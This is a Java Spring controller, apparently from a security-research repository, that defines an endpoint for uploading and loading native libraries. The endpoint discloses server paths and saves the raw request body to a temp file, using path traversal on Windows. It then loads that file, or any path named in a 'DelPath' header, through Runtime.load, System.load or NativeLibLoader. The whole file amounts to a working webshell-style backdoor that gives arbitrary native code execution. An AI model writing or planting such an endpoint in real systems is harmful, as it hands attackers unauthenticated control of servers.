package summersec.echo.Controller;

import com.sun.glass.utils.NativeLibLoader;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.util.Random;

/**
 * @ClassName: AddDll
 * @Description: TODO
 * @Author: Summer
 * @Date: 2022/1/15 14:29
 * @Version: v1.0.0
 * @Description: 加载dll
 **/
@Controller
@RequestMapping(value = "/dll")
public class AddDll extends HttpServlet{

    @RequestMapping(value = "/dll3")
    public void Dll3(HttpServletRequest req, HttpServletResponse resp) throws  IOException {
        String webrootpath=req.getServletContext().getRealPath("/");
        String webjsppath=req.getServletPath();
        String midilepath=(new File(".").getAbsolutePath());
        PrintWriter out = resp.getWriter();
        out.println("WebRootPath:");
        out.println(webrootpath);
        out.println("ServletPath:");
        out.println(webjsppath);
        out.println("WebServerPath:");
        out.println(midilepath);
        try {
            boolean flag = false;
            String fp = req.getParameter("up");

            try {
                if (fp != null) {
                    Random random = new Random(System.currentTimeMillis());
                    String os = System.getProperty("os.name").toLowerCase();
                    if (os.contains("windows")){
                        if (fp.contains("nat")){
                            String java = System.getProperty("java.home");
                            fp = java + "../../../../../../../../../../../../../../../temp/dm" + random.nextInt(10000000) + "1.dll";
                        }else {
                            fp = "C:/Windows/temp/dm"+ random.nextInt(10000000) + "1.dll";
                        }
                    }else {
                        fp = "/tmp/dm"+ random.nextInt(10000000) + "1.dll";
                    }
                    File file = new File(fp);
                    if (file.exists()){
                        out.println("file is exists!");
                    }else {
                        FileOutputStream fos = new FileOutputStream(file);
                        InputStream inputStream = req.getInputStream();
                        byte temp[] = new byte[1024];
                        int size = -1;
                        while ((size = inputStream.read(temp)) != -1) { // 循环读取
                            fos.write(temp, 0, size);
                        }
                        fos.flush();
                        fos.close();
                        fp = file.getAbsolutePath();
                        flag = true;
                        out.println("dll is uploaded!!!");
                    }
                }
            }catch (Exception e){}
            out.println("dll location is " + fp);
            String delpath = null;
            if (flag){
                delpath = fp;
            }else {
                delpath = req.getHeader("DelPath");
            }
            if (!delpath.isEmpty()){
                try {
                    if (flag){
                        Runtime.getRuntime().load(delpath);
                        out.println(delpath + "dll is load!!!");
                        flag =false;
                    }
                    if (flag){
                        System.load(delpath);
                        out.println(delpath + "dll is load!!!");
                        flag = false;
                    }
                }catch (Exception e){
                    try {
                        NativeLibLoader.loadLibrary(delpath);
                        out.println(delpath + "dll is load!!!");
                        flag = false;
                    }catch (Exception e1){
                        out.println(e1);
                    }
                }
                if (flag) {
                    out.println(delpath + "dll load is failed!!!");
                }

            }
        }catch (Exception e2){
            out.println(e2);
        }
        out.println("if dll  will be auto load in uploading !!!");
        out.flush();
        out.close();

    }
    // 加载jsp 上传 dll
    @RequestMapping("/addjsp")
    public String AddJsp() {
        return "AddDll";
    }


}
